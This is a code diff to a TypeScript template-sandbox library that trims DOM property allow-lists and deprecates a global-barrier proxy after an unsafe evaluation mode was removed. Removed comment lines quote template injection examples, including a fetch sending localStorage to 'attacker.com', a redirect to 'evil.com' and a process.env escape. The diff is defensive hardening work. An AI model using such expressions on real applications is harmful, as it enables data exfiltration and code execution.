@@ -483,8 +483,9 @@ const SAFE_DOM_READ_PROPS: { [key: string]: 1 } = {
   textContent: 1, innerHTML: 1, innerText: 1, value: 1,
   checked: 1, disabled: 1, selected: 1, hidden: 1,
   // Attributes (SECURITY: Only READ methods allowed, NO setAttribute/setAttributeNode)
-  getAttribute: 1, /* setAttribute: BLOCKED */, removeAttribute: 1, hasAttribute: 1,
-  getAttributeNode: 1, /* setAttributeNode: BLOCKED */,
+  // NOTE: setAttribute and setAttributeNode are intentionally omitted (blocked for security)
+  getAttribute: 1, removeAttribute: 1, hasAttribute: 1,
+  getAttributeNode: 1,
   // Classes
   classList: 1,
   // Style
@@ -522,8 +523,9 @@ const SAFE_DOM_READ_PROPS: { [key: string]: 1 } = {
 const SAFE_DOM_WRITE_PROPS: { [key: string]: 1 } = {
   __proto__: null,
   // Element properties (safe to write)
+  // NOTE: innerHTML is intentionally omitted (blocked for XSS prevention - use SafeHTML)
   id: 1, className: 1,
-  textContent: 1, /* innerHTML: BLOCKED */, innerText: 1, value: 1,
+  textContent: 1, innerText: 1, value: 1,
   checked: 1, disabled: 1, selected: 1, hidden: 1,
   scrollLeft: 1, scrollTop: 1,
   // Note: setAttribute, style, classList, dataset are methods/objects - setting is handled by their own APIs
@@ -651,13 +653,16 @@ export function createElementMembrane(element: any): any {
   return membrane;
 }
 
-// === GLOBAL BARRIER: Prevents Standard Mode Global Scope Escape ===
+// === GLOBAL BARRIER: Safe Globals for Expression Evaluation ===
+// NOTE: Standard Mode with `new Function()` has been REMOVED (SEC-FINAL-005).
+// These safe globals are still used by SafeExprParser for expressions like {{ Math.max(1, 2) }}.
 
 /**
  * Safe global objects and functions allowed in expressions.
  *
- * CRITICAL SECURITY (Issue #1): Without this whitelist, Standard Mode allows
- * RCE via global scope access: {{ window.location }}, {{ process.env }}, etc.
+ * Used by SafeExprParser to provide controlled access to JavaScript built-ins
+ * like Math, Date, Array, etc. without exposing dangerous globals like
+ * window, process, or fetch.
  */
 const SAFE_GLOBALS: { [key: string]: any } = {
   __proto__: null,
@@ -703,26 +708,9 @@ const SAFE_GLOBALS: { [key: string]: any } = {
  * Creates a Global Barrier proxy that blocks access to dangerous globals
  * while allowing safe globals through a whitelist.
  *
- * CRITICAL SECURITY FIX (Issue #1): Standard Mode Global Escape
- *
- * Without this barrier, expressions can access the global scope:
- * - {{ window.location.href = 'http://evil.com' }} - RCE
- * - {{ fetch('http://attacker.com', { body: localStorage }) }} - Data exfiltration
- * - {{ Function('return process')().env }} - Server-side RCE
- *
- * The barrier works with the `with` statement:
- * ```javascript
- * with(GlobalBarrier) { with(c) { with(s) { return expression } } }
- * ```
- *
- * When JavaScript evaluates a variable:
- * 1. First checks `has(GlobalBarrier, 'variableName')`
- * 2. If TRUE, calls `get(GlobalBarrier, 'variableName')` - returns our whitelisted value or undefined
- * 3. If FALSE, looks in outer scope (context c, then state s)
- *
- * Strategy:
- * - `has` returns TRUE for EVERYTHING (captures all global lookups)
- * - `get` returns whitelisted globals or undefined (blocks dangerous access)
+ * @deprecated This function was used by Standard Mode (now removed in SEC-FINAL-005).
+ * SafeExprParser handles global access differently using SAFE_GLOBALS map.
+ * This code is kept for reference but is no longer called.
  *
  * @returns {Proxy} Global barrier proxy
  */
